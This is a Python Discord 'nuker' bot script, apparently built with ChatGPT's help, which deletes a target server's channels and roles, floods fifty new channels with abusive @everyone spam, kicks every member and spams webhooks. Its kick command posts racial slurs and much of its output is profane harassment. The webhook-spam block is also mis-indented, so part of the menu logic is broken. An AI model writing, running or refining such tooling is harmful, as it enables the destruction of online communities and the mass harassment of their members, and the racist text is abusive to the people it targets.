import time
import os
import sys
import subprocess

os.system("title Arc V1 (made by vxcn 💖")

def install_requirements_if_needed():
    """Check if requirements are installed, and install them if they're not."""
    try:
        # Run pip check on the requirements file to identify missing or outdated packages
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "-r", "requirements.txt", "--upgrade", "--quiet"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        # Output only if packages were installed or upgraded
        if result.returncode == 0:
            print("All dependencies are up to date.")
        else:
            print("Some dependencies were missing or outdated and have been installed.")

    except FileNotFoundError:
        print("requirements.txt not found.")
    except subprocess.CalledProcessError as e:
        print(f"Error during installation: {e}")

# Run the function at the start of the script
if os.path.isfile("requirements.txt"):
    install_requirements_if_needed()
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
import discord
from discord.ext import commands
import asyncio
import logging
import colorama
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)




logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger().setLevel(logging.CRITICAL)

# Set up intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True  # Enable member intents
intents.messages = True
intents.message_content = True  # Enable message content intent

# Create the bot instance
bot = commands.Bot(command_prefix='!', intents=intents)

async def async_input(prompt: str) -> str:
    """Async wrapper for input() to avoid blocking the bot."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, input, prompt)

@bot.event
async def on_ready():
    # Display the bot's username and ID
    print(Fore.RED + f'Bot is ready. Logged in as {bot.user} (ID: {bot.user.id})')

    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')

    # ASCII art for "DSC NUKER"
    dsc_nuker_ascii = (
        Fore.RED + " $$$$$$\\  $$$$$$$\\   $$$$$$\\        $$\\    $$\\   $$\\   \n" +
        Fore.RED + "$$  __$$\\ $$  __$$\\ $$  __$$\\       $$ |   $$ |$$$$ |  \n" +
        Fore.RED + "$$ /  $$ |$$ |  $$ |$$ /  \\__|      $$ |   $$ |\\_$$ |  \n" +
        Fore.RED + "$$$$$$$$ |$$$$$$$  |$$ |            \\$$\\  $$  |  $$ |  \n" +
        Fore.RED + "$$  __$$ |$$  __$$< $$ |             \\$$\\$$  /   $$ |  \n" +
        Fore.RED + "$$ |  $$ |$$ |  $$ |$$ |  $$\\         \\$$$  /    $$ |  \n" +
        Fore.RED + "$$ |  $$ |$$ |  $$ |\\$$$$$$  |         \\$  /   $$$$$$\\ \n" +
        Fore.RED + "\\__|  \\__|\\__|  \\__| \\______/           \\_/    \\______| \n" +
        Fore.RED + "                                                        \n" +
        Fore.RED + "                                                        \n" +
        Fore.RED + "                                                        \n"
    )

    # Display ASCII art
    print(dsc_nuker_ascii)
    time.sleep(2)

    # Ask the user to choose between Discord ServerID or Chat Beta
    while True:
        print(Fore.RED + "Select an option:")
        print(Fore.RED + "1. ServerID nuke")
        print(Fore.RED + "2. Use Message Nuke")
        print(Fore.RED + "3. Webhook Spammer")  # Moved Webhook Spammer to option 3
        print(Fore.RED + "4. Commands")  # Moved Commands to option 4
        print(" ")

        choice = await async_input(Fore.RED + "Input: ")

        os.system('cls' if os.name == 'nt' else 'clear')

        if choice == '1':
            server_id = await async_input(Fore.RED + "Please enter the Discord server ID you want to nuke: ")
            guild = bot.get_guild(int(server_id))
            if guild is None:
                print(Fore.RED + "I cannot find a server with that ID (or the bot is not in it)")
            else:
                await perform_nuke(guild)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"Starting nuke on {server_id}!")
            time.sleep(2) 
            os.system('cls' if os.name == 'nt' else'clear')
            print("Check the server!")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')

        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Fore.RED + "Say !nuke in any channel")

        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            webhook_url = await async_input(Fore.RED + "Please enter the Discord webhook URL: ")
            message_content = await async_input(Fore.RED + "What message do you want to send? ")
            message_count = int(await async_input(Fore.RED + "How many messages do you want to send? "))
            delete_webhook = await async_input(Fore.RED + "Do you want to delete the webhook after sending messages? (yes/no) (has to be lowercase): ")
	    

        for _ in range(message_count):
            requests.post(webhook_url, json={"content": message_content})

        print(Fore.RED + f"Sent {message_count} messages to the webhook.")

        if delete_webhook.lower() == 'yes':
            requests.delete(webhook_url)
            print(Fore.RED + "Webhook has been deleted.")

            time.sleep(4)
            os.system('cls' if os.name == 'nt' else 'clear')

        elif choice == '4':
            while True:
                print(Fore.RED + "Commands:")
                print(Fore.RED + "!nuke")
                print(Fore.RED + "!kick")
                print(" ")
                print(" ")
                print(Fore.YELLOW + "Type 5 to go back to the main menu.")
                choice = await async_input(Fore.RED + "Input: ")

                if choice == '5':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    break
                else:
                    print(Fore.RED + "Invalid input. Please type 5 to go back.")
                    time.sleep(2)
                    os.system('cls' if os.name == 'nt' else 'clear')

        else:
            print(Fore.RED + "Invalid choice.")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')

@bot.event
async def on_command_error(ctx, error):

  pass

async def perform_nuke(guild):
    # Delete all channels
    for channel in guild.channels:
        await channel.delete()
        await asyncio.sleep(0)  # Delay to avoid rate limits


    new_channels = []
    for i in range(50):
        channel = await guild.create_text_channel(f'NUKED-LOL')
        new_channels.append(channel)


    async def spam_messages(channel):
        for _ in range(10000):  
            await channel.send(f'@everyone I RUN YOU BITCH')
            await asyncio.sleep(0)
            await channel.send(f'@everyone FUCK YOU')
            await asyncio.sleep(0)


    for channel in new_channels:
        bot.loop.create_task(spam_messages(channel))


    await asyncio.sleep(1200)  # Adjust the duration as needed

    # q
    for role in guild.roles:
        if role.name != "@everyone":  # Don't delete the @everyone role
            await role.delete()

    # test
    for _ in range(25):
        await guild.create_role(name="FUCK YOU")

    print("Nuke operation completed!")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    await perform_nuke(guild)
    await ctx.send("Nuke operation completed!")

@bot.command()
async def kick(ctx):
    guild = ctx.guild

    # Create a list of kick tasks
    kick_tasks = []

    # Kick all members except the bot and the command issuer
    for member in guild.members:
        if member != ctx.author and member != bot.user:
            kick_tasks.append(member.kick(reason="GET KICKED"))

    # Execute all kick tasks with a limit to avoid hitting rate limits
    for i in range(0, len(kick_tasks), 8):  # Adjust the batch size as needed
        batch = kick_tasks[i:i + 8]
        results = await asyncio.gather(*batch, return_exceptions=True)

        # Handle results
        for member, result in zip(batch, results):
            if isinstance(result, discord.Forbidden):
                await ctx.send(f'DUMB NIGGA I CANT KICK {member.name}!')
            elif isinstance(result, discord.HTTPException):
                await ctx.send(f'GET KICKED DUMB N1GGA')
            else:
                await ctx.send(f'STUPID NIGG3R')

        await asyncio.sleep(0)  # Add a delay between batches to avoid rate limits


# Load token from a file (create it if it doesn't exist)
token_file = "token.txt"  # Name of the token file
if not os.path.exists(token_file):
    print(Fore.RED + "Made with love by vxcn 💖 (and chatgpt) ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    token = input(Fore.RED + "Please enter your bot token: ")
    with open(token_file, "w") as f:
        f.write(token)
else:
    with open(token_file, "r") as f:
        token = f.read().strip()
os.system('cls' if os.name == 'nt' else 'clear')
bot.run(token, log_level=logging.CRITICAL)
